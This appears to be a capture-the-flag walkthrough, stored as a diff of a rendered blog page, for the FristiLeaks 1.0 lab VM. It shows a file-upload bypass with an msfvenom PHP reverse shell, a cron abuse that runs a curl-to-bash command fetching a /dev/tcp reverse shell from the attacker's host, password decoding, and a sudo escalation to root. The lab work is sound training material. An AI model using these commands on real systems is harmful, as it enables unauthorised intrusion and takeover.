@@ -1,0 +1,309 @@
+I"�S<p>This is a linux machine vulnerable to File Upload, allowing an attacker upload arbitrary files simply by modifying the extension, which allowed me to gain access to the system, a cron job and exposed encoded passwords allowed me to scale between different users, and taking advantage of sudo permissions I got root.</p>
+
+<p>You need to edit the VM’s MAC address to 08:00:27:A5:A6:76 for it to works.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>t@kali:~/fristileaks<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.169 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>The full TCP/UDP scan with unicornscan found only one port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.169:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.169:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+...
+listener statistics 104316 packets recieved 0 packets droped and 0 interface drops
+TCP open                    http[   80]         from 192.168.179.169  ttl 64 
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>Service detection and script scanning was performed against the open port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p80</span> 192.168.179.169 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
+| http-methods: 
+|   Supported Methods: GET HEAD POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+</span></code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Nothing was found in the web page including the robots.txt file.</p>
+
+<p><img src="/assets/images/fristileaks/screenshot-1.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>curl http://192.168.179.169/robots.txt                           
+User-agent: <span class="k">*</span>
+Disallow: /cola
+Disallow: /sisi
+Disallow: /beer
+</code></pre></div></div>
+
+<p>Reading the image of the home page I tried to look up the word <strong>fristi</strong> in the browser and it redirected me to an admin page.</p>
+
+<p><img src="/assets/images/fristileaks/screenshot-2.png" alt="" /></p>
+
+<p>In the source of the page I found the user <strong>eezeepz</strong>, and at the bottom of the page a base 64 encoded string.</p>
+
+<p><img src="/assets/images/fristileaks/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/fristileaks/screenshot-4.png" alt="" /></p>
+
+<p>I decoded the base 64 string, this contains an image with a password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.169/fristi/ | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1703,1724p'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> image.png
+
+root@kali:~/fristileaks<span class="nv">$ </span>ristretto image.png
+</code></pre></div></div>
+
+<p><img src="/assets/images/fristileaks/screenshot-5.png" alt="" /></p>
+
+<p>I logged in with those creds and has access to a file upload page.</p>
+
+<p><img src="/assets/images/fristileaks/screenshot-6.png" alt="" /></p>
+
+<p><img src="/assets/images/fristileaks/screenshot-7.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="file-upload">File Upload</h3>
+
+<p>To bypass the file upload functionality was possible adding the jpg extension to the php reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>msfvenom <span class="nt">-p</span> php/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-o</span> z.php.jpg
+</code></pre></div></div>
+
+<p>We upload the reverse shell, this was created successfully into the uploads directory.</p>
+
+<p><img src="/assets/images/fristileaks/screenshot-8.png" alt="" /></p>
+
+<p><img src="/assets/images/fristileaks/screenshot-9.png" alt="" /></p>
+
+<p>We start a netcat listener on port 443 and run the following curl request.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>curl http://192.168.179.169/fristi/uploads/z.php.jpg
+</code></pre></div></div>
+
+<p>We get a shell with apache permissions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.169] 34123
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>48<span class="o">(</span>apache<span class="o">)</span>
+script <span class="nt">-qc</span> /bin/bash /dev/null
+bash-4.1<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>I found a note in the <strong>/var/www/</strong> directory for <strong>eezeepz</strong>, this catches my attention.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /var/www
+<span class="nb">cd</span> /var/www
+bash-4.1<span class="nv">$ </span><span class="nb">ls 
+ls 
+</span>cgi-bin  error  html  icons  notes.txt
+bash-4.1<span class="nv">$ </span><span class="nb">cat </span>notes.txt 
+<span class="nb">cat </span>notes.txt
+hey eezeepz your homedir is a mess, go clean it up, just dont delete
+the important stuff.
+
+<span class="nt">-jerry</span>
+</code></pre></div></div>
+
+<p>There are many files in eezeepzs’s home directory .</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cd</span> /home/eezeepz
+bash-4.1<span class="nv">$ </span><span class="nb">ls 
+</span>MAKEDEV    <span class="nb">chown        hostname  </span>netreport       taskset     weak-modules
+cbq        clock        hwclock   netstat         tc          wipefs
+cciss_id   consoletype  kbd_mode  new-kernel-pkg  telinit     xfs_repair
+cfdisk     cpio         <span class="nb">kill      nice            touch       </span>ypdomainname
+chcpu      cryptsetup   killall5  nisdomainname   tracepath   zcat
+<span class="nb">chgrp      </span>ctrlaltdel   kpartx    nologin         tracepath6  zic
+chkconfig  <span class="nb">cut          </span>nameif    notes.txt       <span class="nb">true
+chmod      </span>halt         nano      <span class="nb">tar             </span>tune2fs
+</code></pre></div></div>
+
+<p>The notes.txt file contains a message that we can use the binaries specifying the full path <strong>/usr/bin/</strong> or <strong>/home/admin/</strong>, we can write our commands ia a file called <strong>runthis</strong> in /tmp directory, a cron job is working behind this.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">cat </span>notes.txt
+Yo EZ,
+
+I made it possible <span class="k">for </span>you to <span class="k">do </span>some automated checks, 
+but I did only allow you access to /usr/bin/<span class="k">*</span> system binaries. I did
+however copy a few extra often needed commands to my 
+homedir: <span class="nb">chmod</span>, <span class="nb">df</span>, <span class="nb">cat</span>, <span class="nb">echo</span>, ps, <span class="nb">grep</span>, egrep so you can use those
+from /home/admin/
+
+Don<span class="s1">'t forget to specify the full path for each binary!
+
+Just put a file called "runthis" in /tmp/, each line one command. The 
+output goes to the file "cronresult" in /tmp/. It should 
+run every minute with my account privileges.
+
+- Jerry
+</span></code></pre></div></div>
+
+<p>A cron job with admin permissions is running, we can see it by listing the processes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span>ps auxwe | <span class="nb">grep </span>admin
+ps auxwe | <span class="nb">grep </span>admin
+admin     2063  0.0  0.7 115048  3768 ?        Ss   03:59   0:00 /usr/bin/python /home/admin/cronjob.py
+</code></pre></div></div>
+
+<p>To get a shell as the user <strong>admin</strong>, I created the <strong>runthis</strong> file with a curl command that downloads our bash reverse shell and executes it, and finally I give it execute perisssions.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.1<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/usr/bin/curl 192.168.179.1:8000/getadmin | bash'</span> <span class="o">&gt;</span> /tmp/runthis
+bash-4.1<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/runthis
+</code></pre></div></div>
+
+<p>On the attacking machine I create a bash reverse shell and start a web server with python.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/1337 0&gt;&amp;1"'</span> <span class="o">&gt;</span> getadmin
+root@kali:~/fristileaks<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 
+</code></pre></div></div>
+
+<p>We wait a moment and we have a shell as user <strong>admin</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.169] 50841
+bash: no job control <span class="k">in </span>this shell
+<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>501<span class="o">(</span>admin<span class="o">)</span>
+</code></pre></div></div>
+
+<p>In the home directory there are two files that contain an encoded string.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>cryptedpass.txt
+mVGZ3O3omkJLmy2pcuTq
+
+<span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>whoisyourgodnow.txt
+<span class="nb">cat </span>whoisyourgodnow.txt
+<span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG
+</code></pre></div></div>
+
+<p>Also was found a python script that encodes a string to base64, rot13 and reverts it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span><span class="nb">cat </span>cryptpass.py
+<span class="nb">cat </span>cryptpass.py
+<span class="c">#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn</span>
+import <span class="nb">base64</span>,codecs,sys
+
+def encodeString<span class="o">(</span>str<span class="o">)</span>:
+    <span class="nv">base64string</span><span class="o">=</span> base64.b64encode<span class="o">(</span>str<span class="o">)</span>
+    <span class="k">return </span>codecs.encode<span class="o">(</span>base64string[::-1], <span class="s1">'rot13'</span><span class="o">)</span>
+
+<span class="nv">cryptoResult</span><span class="o">=</span>encodeString<span class="o">(</span>sys.argv[1]<span class="o">)</span>
+print cryptoResult
+</code></pre></div></div>
+
+<p>The following python script performs the reverse process.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">codecs</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [string]"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">string</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1"># Decode the Rot13 string
+</span><span class="k">def</span> <span class="nf">decodeRot13</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">codecs</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="s">'rot13'</span><span class="p">)</span>
+
+<span class="c1"># Reverse the string
+</span><span class="k">def</span> <span class="nf">revString</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+   <span class="k">return</span> <span class="n">x</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="c1"># Decode the base64 string
+</span><span class="k">def</span> <span class="nf">b64Decode</span><span class="p">(</span><span class="n">y</span><span class="p">):</span>
+    <span class="n">string</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">string</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+
+<span class="n">txt</span> <span class="o">=</span> <span class="n">b64Decode</span><span class="p">(</span><span class="n">decodeRot13</span><span class="p">(</span><span class="n">revString</span><span class="p">(</span><span class="n">string</span><span class="p">)))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>We run the script and get the password for <strong>fristigod</strong> user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/fristileaks<span class="nv">$ </span>python3 decryptpass.py <span class="o">=</span>RFn0AKnlMHMPIzpyuTI0ITG 
+LetThereBeFristi!
+</code></pre></div></div>
+
+<p>We switched to the user <strong>fristigod</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>admin@localhost ~]<span class="nv">$ </span>su - fristigod
+su - fristigod
+Password: LetThereBeFristi!
+
+<span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>502<span class="o">(</span>fristigod<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Listing the sudo permissions, we see that <strong>fristigod</strong> can execue the <strong>doCom</strong> script as user fristi.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>fristigod: LetThereBeFristi!
+
+Matching Defaults entries <span class="k">for </span>fristigod on this host:
+    requiretty, <span class="o">!</span>visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User fristigod may run the following commands on this host:
+    <span class="o">(</span>fristi : ALL<span class="o">)</span> /var/fristigod/.secret_admin_stuff/doCom
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>To get root we need to run <strong>doCom</strong> script as user <strong>fristi</strong> and add bash as parameter.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-4</span>.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom bash
+<span class="nb">sudo</span> <span class="nt">-u</span> fristi /var/fristigod/.secret_admin_stuff/doCom bash
+bash-4.1# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,502<span class="o">(</span>fristigod<span class="o">)</span>
+
+
+bash-4.1# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+bash-4.1# <span class="nb">ls
+ls
+</span>fristileaks_secrets.txt
+bash-4.1# <span class="nb">cat </span>fristileaks_secrets.txt
+<span class="nb">cat </span>fristileaks_secrets.txt
+Congratulations on beating FristiLeaks 1.0 by Ar0xA <span class="o">[</span>https://tldr.nu]
+
+I wonder <span class="k">if </span>you beat it <span class="k">in </span>the maximum 4 hours it<span class="s1">'s supposed to take!
+
+Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)
+
+
+Flag: Y0u_kn0w_y0u_l0ve_fr1st1
+</span></code></pre></div></div>
+:ET
